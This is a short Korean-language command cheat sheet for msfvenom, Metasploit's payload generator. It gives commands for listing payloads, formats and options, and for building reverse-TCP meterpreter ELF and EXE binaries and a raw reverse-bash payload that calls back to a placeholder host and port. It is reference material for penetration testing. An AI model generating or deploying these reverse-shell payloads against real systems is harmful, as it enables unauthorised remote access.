# msfvenom

> Metasploit의 페이로드를 수동으로 생성.
> 더 많은 정보: <https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html>.

- 페이로드 목록 표시:

`msfvenom -l payloads`

- 형식 목록 표시:

`msfvenom -l formats`

- 페이로드 옵션 표시:

`msfvenom -p {{페이로드}} --list-options`

- 역방향 TCP 핸들러로 ELF 바이너리 생성:

`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={{로컬_IP}} LPORT={{로컬_포트}} -f elf -o {{경로/대상/바이너리}}`

- 역방향 TCP 핸들러로 EXE 바이너리 생성:

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{로컬_IP}} LPORT={{로컬_포트}} -f exe -o {{경로/대상/바이너리.exe}}`

- 역방향 TCP 핸들러로 원시 Bash 생성:

`msfvenom -p cmd/unix/reverse_bash LHOST={{로컬_IP}} LPORT={{로컬_포트}} -f raw`
